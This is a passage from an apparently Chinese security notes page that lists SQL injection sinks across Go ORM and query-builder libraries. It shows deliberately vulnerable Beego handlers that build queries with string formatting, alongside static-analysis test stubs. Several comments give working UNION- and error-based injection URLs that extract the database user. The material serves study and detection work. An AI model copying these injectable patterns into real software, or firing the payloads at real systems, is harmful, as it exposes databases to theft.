&#125;</span><br><span class="line">	output, err := json.Marshal(user)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="built_in">panic</span>(err)</span><br><span class="line">	&#125;</span><br><span class="line">	c.Ctx.ResponseWriter.Write(output)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>xorm错误使用</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">engine, err := xorm.NewEngine(<span class="string">&quot;mysql&quot;</span>, source)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">    <span class="built_in">panic</span>(err)</span><br><span class="line">&#125;</span><br><span class="line">engine.ShowSQL(<span class="literal">true</span>)</span><br><span class="line">user := models.User&#123;&#125;</span><br><span class="line">session := engine.Prepare().And(fmt.Sprintf(<span class="string">&quot;%s like ?&quot;</span>, field), username)</span><br><span class="line">ok, err := session.Get(&amp;user)</span><br></pre></td></tr></table></figure>



<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">engine1 := xorm1.Engine&#123;&#125;</span><br><span class="line">engine1.Query(query)          <span class="comment">// $ querystring=query</span></span><br><span class="line">engine1.QueryString(query)    <span class="comment">// $ querystring=query</span></span><br><span class="line">engine1.QueryInterface(query) <span class="comment">// $ querystring=query</span></span><br><span class="line">engine1.SQL(query)            <span class="comment">// $ querystring=query</span></span><br><span class="line">engine1.Where(query)          <span class="comment">// $ querystring=query</span></span><br><span class="line">engine1.Alias(query)          <span class="comment">// $ querystring=query</span></span><br><span class="line">engine1.NotIn(query)          <span class="comment">// $ querystring=query</span></span><br><span class="line">engine1.In(query)             <span class="comment">// $ querystring=query</span></span><br><span class="line">engine1.Select(query)         <span class="comment">// $ querystring=query</span></span><br><span class="line">engine1.SetExpr(query, <span class="literal">nil</span>)   <span class="comment">// $ querystring=query</span></span><br><span class="line">engine1.OrderBy(query)        <span class="comment">// $ querystring=query</span></span><br><span class="line">engine1.Having(query)         <span class="comment">// $ querystring=query</span></span><br><span class="line">engine1.GroupBy(query)        <span class="comment">// $ querystring=query</span></span><br></pre></td></tr></table></figure>

<h2 id="github-com-Masterminds-squirrel"><a href="#github-com-Masterminds-squirrel" class="headerlink" title="github.com&#x2F;Masterminds&#x2F;squirrel"></a>github.com&#x2F;Masterminds&#x2F;squirrel</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// http://127.0.0.1:233/sqlInjection/generator/vuln/squirrel?order=id%20AND%20GTID_SUBSET(CONCAT(0x7171717071%2C(MID((IFNULL(CAST(CURRENT_USER()%20AS%20NCHAR)%2C0x20))%2C1%2C190))%2C0x71717a7071)%2C6738)&amp;username=admin</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *SqlInjectionVuln4Controller)</span></span> Get() &#123;</span><br><span class="line">	username := c.GetString(<span class="string">&quot;username&quot;</span>)</span><br><span class="line">	order := c.GetString(<span class="string">&quot;order&quot;</span>)</span><br><span class="line">	db, err := sql.Open(<span class="string">&quot;mysql&quot;</span>, source)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="built_in">panic</span>(err)</span><br><span class="line">	&#125;</span><br><span class="line">	err = db.Ping()</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="built_in">panic</span>(err)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">defer</span> db.Close()</span><br><span class="line">	expression := sq.Select(<span class="string">&quot;*&quot;</span>).From(<span class="string">&quot;user&quot;</span>).Where(sq.Eq&#123;<span class="string">&quot;username&quot;</span>: username&#125;).OrderBy(order)</span><br><span class="line">	sqlStr, args, err := expression.ToSql()</span><br><span class="line">	fmt.Println(sqlStr)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="built_in">panic</span>(err)</span><br><span class="line">	&#125;</span><br><span class="line">	user := models.User&#123;&#125;</span><br><span class="line">	err = db.QueryRow(sqlStr, args...).Scan(&amp;user.Id, &amp;user.Username, &amp;user.Password)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="built_in">panic</span>(err)</span><br><span class="line">	&#125;</span><br><span class="line">	output, err := json.Marshal(user)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="built_in">panic</span>(err)</span><br><span class="line">	&#125;</span><br><span class="line">	c.Ctx.ResponseWriter.Write(output)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">squirrelTest</span><span class="params">(querypart <span class="type">string</span>)</span></span> &#123;</span><br><span class="line">	squirrel.Select(<span class="string">&quot;*&quot;</span>).From(<span class="string">&quot;users&quot;</span>).Where(squirrel.Expr(querypart)) <span class="comment">// $ querystring=querypart</span></span><br><span class="line">	squirrel.Select(<span class="string">&quot;*&quot;</span>).From(<span class="string">&quot;users&quot;</span>).Where(querypart)                <span class="comment">// $ querystring=querypart</span></span><br><span class="line">	squirrel.Select(<span class="string">&quot;*&quot;</span>).From(<span class="string">&quot;users&quot;</span>).Suffix(querypart)               <span class="comment">// $ querystring=querypart</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="github-com-uptrace-bun"><a href="#github-com-uptrace-bun" class="headerlink" title="github.com&#x2F;uptrace&#x2F;bun"></a>github.com&#x2F;uptrace&#x2F;bun</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">// http://127.0.0.1:233/sqlInjection/generator/vuln/bun?username=admin&#x27;%20UNION%20ALL%20SELECT%20NULL%2CCONCAT(0x717a707071%2CIFNULL(CAST(CURRENT_USER()%20AS%20CHAR)%2C0x20)%2C0x71716a6271)%2CNULL--%20-</span><br><span class="line">func (c *SqlInjectionVuln5Controller) Get() &#123;</span><br><span class="line">	username := c.GetString(&quot;username&quot;)</span><br><span class="line">	db, err := sql.Open(&quot;mysql&quot;, source)</span><br><span class="line">	if err != nil &#123;</span><br><span class="line">		panic(err)</span><br><span class="line">	&#125;</span><br><span class="line">	bundb := bun.NewDB(db, mysqldialect.New())</span><br><span class="line">	ctx := context.Background()</span><br><span class="line">	// 构造可能导致 SQL 注入的查询</span><br><span class="line">	query := fmt.Sprintf(&quot;SELECT * FROM user WHERE username = &#x27;%s&#x27; &quot;, username)</span><br><span class="line">	var users []Users</span><br><span class="line">	err = bundb.NewRaw(query).Scan(ctx, &amp;users)</span><br><span class="line">	if err != nil &#123;</span><br><span class="line">		panic(err)</span><br><span class="line">	&#125;</span><br><span class="line">	output, err := json.Marshal(users)</span><br><span class="line">	c.Ctx.ResponseWriter.Write(output)</span><br><span class="line">	//db := bun.NewDB(sqlite, sqlitedialect.New())</span><br><span class="line">	//bun.NewRawQuery(db, untrusted)</span><br><span class="line">	//</span><br><span class="line">	//db.ExecContext(ctx, untrusted)</span><br><span class="line">	//db.PrepareContext(ctx, untrusted)</span><br><span class="line">	//db.QueryContext(ctx, untrusted)</span><br><span class="line">	//db.QueryRowContext(ctx, untrusted)</span><br><span class="line">	//</span><br><span class="line">	//db.Exec(untrusted)</span><br><span class="line">	//db.NewRaw(untrusted)</span><br><span class="line">	//db.Prepare(untrusted)</span><br><span class="line">	//db.Query(untrusted)</span><br><span class="line">	//db.QueryRow(untrusted)</span><br><span class="line">	//db.Raw(untrusted)</span><br><span class="line">	//</span><br><span class="line">	//db.NewSelect().ColumnExpr(untrusted)</span><br><span class="line">	//db.NewSelect().DistinctOn(untrusted)</span><br><span class="line">	//db.NewSelect().For(untrusted)</span><br><span class="line">	//db.NewSelect().GroupExpr(untrusted)</span><br><span class="line">	//db.NewSelect().Having(untrusted)</span><br><span class="line">	//db.NewSelect().ModelTableExpr(untrusted)</span><br><span class="line">	//db.NewSelect().OrderExpr(untrusted)</span><br><span class="line">	//db.NewSelect().TableExpr(untrusted)</span><br><span class="line">	//db.NewSelect().Where(untrusted)</span><br><span class="line">	//db.NewSelect().WhereOr(untrusted)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="github-com-jinzhu-gorm"><a href="#github-com-jinzhu-gorm" class="headerlink" title="github.com&#x2F;jinzhu&#x2F;gorm"></a>github.com&#x2F;jinzhu&#x2F;gorm</h2><p>&#x2F;&#x2F;go:generate depstubber -vendor github.com&#x2F;jinzhu&#x2F;gorm DB</p>
<p>&#x2F;&#x2F;go:generate depstubber -vendor gorm.io&#x2F;gorm DB</p>
<p><a target="_blank" rel="noopener" href="https://gorm.io/zh_CN/docs/security.html">https://gorm.io/zh_CN/docs/security.html</a></p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// http://127.0.0.1:233/sqlInjection/generator/vuln/gorm?username=admin&#x27;%20UNION%20ALL%20SELECT%20NULL%2CCONCAT(0x717a707071%2CIFNULL(CAST(CURRENT_USER()%20AS%20CHAR)%2C0x20)%2C0x71716a6271)%2CNULL--%20-</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *SqlInjectionVuln6Controller)</span></span> Get() &#123;</span><br><span class="line">	username := c.GetString(<span class="string">&quot;username&quot;</span>)</span><br><span class="line">	db, err := sql.Open(<span class="string">&quot;mysql&quot;</span>, source)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="built_in">panic</span>(err)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">var</span> users []Users</span><br><span class="line">	gormDB, err := gorm.Open(<span class="string">&quot;mysql&quot;</span>, db)</span><br><span class="line">	query := fmt.Sprintf(<span class="string">&quot;SELECT * FROM user WHERE username = &#x27;%s&#x27; &quot;</span>, username)</span><br><span class="line">	rows, err := gormDB.Raw(query).Rows()</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="built_in">panic</span>(err)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">defer</span> rows.Close()</span><br><span class="line">	<span class="keyword">for</span> rows.Next() &#123;</span><br><span class="line">		<span class="keyword">var</span> user Users</span><br><span class="line">		gormDB.ScanRows(rows, &amp;user)</span><br><span class="line">		users = <span class="built_in">append</span>(users, user)</span><br><span class="line">	&#125;</span><br><span class="line">	output, err := json.Marshal(users)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="built_in">panic</span>(err)</span><br><span class="line">	&#125;</span><br><span class="line">	c.Ctx.ResponseWriter.Write(output)</span><br><span class="line"></span><br><span class="line">	<span class="comment">//db1 := gorm1.DB&#123;&#125;</span></span><br><span class="line">	<span class="comment">//db1.Where(untrusted)</span></span><br><span class="line">	<span class="comment">//db1.Raw(untrusted)</span></span><br><span class="line">	<span class="comment">//db1.Not(untrusted)</span></span><br><span class="line">	<span class="comment">//db1.Order(untrusted)</span></span><br><span class="line">	<span class="comment">//db1.Or(untrusted)</span></span><br><span class="line">	<span class="comment">//db1.Select(untrusted)</span></span><br><span class="line">	<span class="comment">//db1.Table(untrusted)</span></span><br><span class="line">	<span class="comment">//db1.Group(untrusted)</span></span><br><span class="line">	<span class="comment">//db1.Having(untrusted)</span></span><br><span class="line">	<span class="comment">//db1.Joins(untrusted)</span></span><br><span class="line">	<span class="comment">//db1.Exec(untrusted)</span></span><br><span class="line">	<span class="comment">//db1.Pluck(untrusted, nil)</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h2 id="github-com-rqlite-gorqlite"><a href="#github-com-rqlite-gorqlite" class="headerlink" title="github.com&#x2F;rqlite&#x2F;gorqlite"></a>github.com&#x2F;rqlite&#x2F;gorqlite</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="comment">//go:generate depstubber -vendor github.com/rqlite/gorqlite Connection Open</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;github.com/rqlite/gorqlite&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">gorqlitetest</span><span class="params">(sql <span class="type">string</span>, sqls []<span class="type">string</span>)</span></span> &#123;</span><br><span class="line">	conn, _ := gorqlite.Open(<span class="string">&quot;dbUrl&quot;</span>)</span><br><span class="line">	conn.Query(sqls)   <span class="comment">// $ querystring=sqls</span></span><br><span class="line">	conn.Queue(sqls)   <span class="comment">// $ querystring=sqls</span></span><br><span class="line">	conn.Write(sqls)   <span class="comment">// $ querystring=sqls</span></span><br><span class="line">	conn.QueryOne(sql) <span class="comment">// $ querystring=sql</span></span><br><span class="line">	conn.QueueOne(sql) <span class="comment">// $ querystring=sql</span></span><br><span class="line">	conn.WriteOne(sql) <span class="comment">// $ querystring=sql</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="github-com-go-pg-pg"><a href="#github-com-go-pg-pg" class="headerlink" title="github.com&#x2F;go-pg&#x2F;pg"></a>github.com&#x2F;go-pg&#x2F;pg</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="comment">//go:generate depstubber -vendor github.com/go-pg/pg Conn,DB,Tx Q</span></span><br><span class="line"><span class="comment">//go:generate depstubber -vendor github.com/go-pg/pg/orm Query Q</span></span><br><span class="line"><span class="comment">//go:generate depstubber -vendor github.com/go-pg/pg/v9 Conn,DB,Tx Q</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;github.com/go-pg/pg&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/go-pg/pg/orm&quot;</span></span><br><span class="line">	newpg <span class="string">&quot;github.com/go-pg/pg/v9&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">pgtest</span><span class="params">(query <span class="type">string</span>, conn pg.Conn, db pg.DB, tx pg.Tx)</span></span> &#123;</span><br><span class="line">	pg.Q(query) <span class="comment">// $ querystring=query</span></span><br><span class="line">	<span class="keyword">var</span> dst []<span class="type">byte</span></span><br><span class="line">	conn.FormatQuery(dst, query) <span class="comment">// $ querystring=query</span></span><br><span class="line">	conn.Prepare(query)          <span class="comment">// $ querystring=query</span></span><br><span class="line">	db.FormatQuery(dst, query)   <span class="comment">// $ querystring=query</span></span><br><span class="line">	db.Prepare(query)            <span class="comment">// $ querystring=query</span></span><br><span class="line">	tx.FormatQuery(dst, query)   <span class="comment">// $ querystring=query</span></span><br><span class="line">	tx.Prepare(query)            <span class="comment">// $ querystring=query</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// go-pg v9 dropped support for `FormatQuery`</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">newpgtest</span><span class="params">(query <span class="type">string</span>, conn newpg.Conn, db newpg.DB, tx newpg.Tx)</span></span> &#123;</span><br><span class="line">	newpg.Q(query)      <span class="comment">// $ querystring=query</span></span><br><span class="line">	conn.Prepare(query) <span class="comment">// $ querystring=query</span></span><br><span class="line">	db.Prepare(query)   <span class="comment">// $ querystring=query</span></span><br><span class="line">	tx.Prepare(query)   <span class="comment">// $ querystring=query</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">sink</span><span class="params">(x <span class="keyword">interface</span>&#123;&#125;)</span></span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">pgormtest</span><span class="params">(query <span class="type">string</span>, q orm.Query)</span></span> &#123;</span><br><span class="line">	orm.Q(query)        <span class="comment">// $ querystring=query</span></span><br><span class="line">	q.ColumnExpr(query) <span class="comment">// $ querystring=query</span></span><br><span class="line">	q.For(query)        <span class="comment">// $ querystring=query</span></span><br><span class="line">	<span class="keyword">var</span> b []<span class="type">byte</span></span><br><span class="line">	q.FormatQuery(b, query) <span class="comment">// $ querystring=query</span></span><br><span class="line">	q.Having(query)         <span class="comment">// $ querystring=query</span></span><br><span class="line">	q.Where(query)          <span class="comment">// $ querystring=query</span></span><br><span class="line">	q.WhereInMulti(query)   <span class="comment">// $ querystring=query</span></span><br><span class="line">	q.WhereOr(query)        <span class="comment">// $ querystring=query</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">var</span> formatter orm.Formatter</span><br><span class="line">	<span class="keyword">var</span> sink1 []<span class="type">byte</span></span><br><span class="line"></span><br><span class="line">	sink2 := formatter.Append(sink1, <span class="string">&quot;Appended1&quot;</span>)</span><br><span class="line">	sink3 := formatter.AppendBytes(sink1, []<span class="type">byte</span>(<span class="string">&quot;Appended2&quot;</span>))</span><br><span class="line">	sink4 := formatter.FormatQuery(sink1, <span class="string">&quot;Query&quot;</span>)</span><br><span class="line"></span><br><span class="line">	sink(sink1) <span class="comment">// $ flowfrom=Appended1 $ flowfrom=Appended2 $ flowfrom=Query</span></span><br><span class="line">	sink(sink2) <span class="comment">// $ flowfrom=Appended1</span></span><br><span class="line">	sink(sink3) <span class="comment">// $ flowfrom=Appended2</span></span><br><span class="line">	sink(sink4) <span class="comment">// $ flowfrom=Query</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="github-com-go-pg-pg-v10"><a href="#github-com-go-pg-pg-v10" class="headerlink" title="github.com&#x2F;go-pg&#x2F;pg&#x2F;v10"></a>github.com&#x2F;go-pg&#x2F;pg&#x2F;v10</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;context&quot;</span></span><br><span class="line">	pg <span class="string">&quot;github.com/go-pg/pg/v10&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Profile <span class="keyword">struct</span> &#123;</span><br><span class="line">	ID   <span class="type">int</span></span><br><span class="line">	Lang <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> User <span class="keyword">struct</span> &#123;</span><br><span class="line">	ID        <span class="type">int</span></span><br><span class="line">	Name      <span class="type">string</span></span><br><span class="line">	ProfileID <span class="type">int</span></span><br><span class="line">	Profile   *Profile <span class="string">`pg:&quot;-&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">getUntrustedString</span><span class="params">()</span></span> <span class="type">string</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="string">&quot;trouble&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"></span><br><span class="line">	untrusted := getUntrustedString()</span><br><span class="line"></span><br><span class="line">	ctx := context.Background()</span><br><span class="line">	db := pg.Connect(&amp;pg.Options&#123;</span><br><span class="line">		Addr:     <span class="string">&quot;:5432&quot;</span>,</span><br><span class="line">		User:     <span class="string">&quot;user&quot;</span>,</span><br><span class="line">		Password: <span class="string">&quot;pass&quot;</span>,</span><br><span class="line">		Database: <span class="string">&quot;db_name&quot;</span>,</span><br><span class="line">	&#125;)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">var</span> version <span class="type">string</span></span><br><span class="line"></span><br><span class="line">	db.Exec(untrusted)</span><br><span class="line">	db.ExecOne(untrusted)</span><br><span class="line">	db.Prepare(untrusted)</span><br><span class="line"></span><br><span class="line">	db.ExecContext(ctx, untrusted)</span><br><span class="line">	db.ExecOneContext(ctx, untrusted)</span><br><span class="line">	db.Query(&amp;version, untrusted)</span><br><span class="line">	db.QueryOne(&amp;version, untrusted)</span><br><span class="line"></span><br><span class="line">	db.QueryOneContext(ctx, pg.Scan(&amp;version), untrusted)</span><br><span class="line">	db.QueryContext(ctx, &amp;version, untrusted)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">var</span> user User</span><br><span class="line">	db.Model(&amp;user).</span><br><span class="line">		ColumnExpr(untrusted).</span><br><span class="line">		Join(untrusted).</span><br><span class="line">		Where(untrusted, <span class="number">123</span>).</span><br><span class="line">		OrderExpr(untrusted).</span><br><span class="line">		GroupExpr(untrusted).</span><br><span class="line">		TableExpr(untrusted).</span><br><span class="line">		WhereIn(untrusted, <span class="number">1</span>).</span><br><span class="line">		WhereInMulti(untrusted, <span class="number">1</span>).</span><br><span class="line">		WhereOr(untrusted, <span class="number">1</span>).</span><br><span class="line">		For(untrusted).</span><br><span class="line">		Having(untrusted).</span><br><span class="line">		Select()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="github-com-jmoiron-sqlx"><a href="#github-com-jmoiron-sqlx" class="headerlink" title="github.com&#x2F;jmoiron&#x2F;sqlx"></a>github.com&#x2F;jmoiron&#x2F;sqlx</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// http://127.0.0.1:233/sqlInjection/generator/vuln/sqlx?username=admin&#x27;%20UNION%20ALL%20SELECT%20CONCAT(0x716a767671%2CIFNULL(CAST(CURRENT_USER()%20AS%20CHAR)%2C0x20)%2C0x717a6b6271)%2CNULL%2CNULL--%20-</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *SqlInjectionVuln7Controller)</span></span> Get() &#123;</span><br><span class="line">	username := c.GetString(<span class="string">&quot;username&quot;</span>)</span><br><span class="line">	sqlxdb, err := sqlx.Open(<span class="string">&quot;mysql&quot;</span>, source)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="built_in">panic</span>(err)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">var</span> users []Users</span><br><span class="line">	query := fmt.Sprintf(<span class="string">&quot;SELECT * FROM user WHERE username = &#x27;%s&#x27;&quot;</span>, username)</span><br><span class="line">	err = sqlxdb.Select(&amp;users, query)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="built_in">panic</span>(err)</span><br><span class="line">	&#125;</span><br><span class="line">	output, err := json.Marshal(users)</span><br><span class="line">	<span 